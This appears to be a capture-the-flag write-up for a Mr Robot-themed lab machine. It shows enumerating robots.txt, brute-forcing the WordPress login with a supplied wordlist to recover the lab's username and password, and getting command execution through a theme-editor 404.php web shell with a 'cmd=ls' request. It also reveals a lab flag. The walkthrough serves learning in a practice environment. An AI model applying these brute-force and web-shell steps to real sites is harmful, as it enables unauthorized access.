## start with mr robot cool theme 
![Screenshot 2023-08-02 at 11-38-26 Screenshot](https://github.com/kiro6/writeups-ctfs/assets/57776872/0bedb10c-91ac-4554-8a0c-35835f328c0c)

## request robots.txt , and i found path for key 1 
```
$ curl "http://10.10.213.185/robots.txt"
User-agent: *
fsocity.dic
key-1-of-3.txt

$ curl "http://10.10.213.185/key-1-of-3.txt"
073403c8a58a1f80d943455fb30724b9

```

## lets check fsocity.dic , it is a downloadable file contating some words  
```
$ head fsocity.dic 
true
false
wikia
from
the
now
Wikia
extensions
scss
window
```

## after browsing fscoscity website i found nothing , using wapplayzer it is using wordpress , i tried to reuqest wp-login.php and we have access to it

## there is a login page i tried to login using random username and password and it gave me this error `ERROR: Invalid username. Lost your password?` we can try bruteforce using `fsocity.dic ` to find the username 

## using burp intruder,FFUF or hydra in my case i used burp intruder and found the username `Elliot` which gave me this error `ERROR: The password you entered for the username Elliot is incorrect` , lets bruteforce the password too , the password is `ER28-0652`

## and we have access to wordpress admin panel , lets get rce via theme editor  
![Screenshot 2023-08-02 at 12-05-29 Edit Themes ‹ user's Blog! — WordPress](https://github.com/kiro6/writeups-ctfs/assets/57776872/2f49b47c-a720-4fc1-80b9-1b24d8fd05c6)


```bash
url "http://10.10.213.185/wp-admin/wp-content/themes/twentyfifteen/404.php?cmd=ls"  
admin
audio
blog
css
fsocity.dic
images
index.html
index.php
intro.webm
js
key-1-of-3.txt
license.bk
license.txt
readme.html
robots.txt
sitemap.xml
sitemap.xml.gz
video
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
you-will-never-guess-this-file-name.txt
<!DOCTYPE html>
<html lang="en-US" class="no-js">
<head>
```
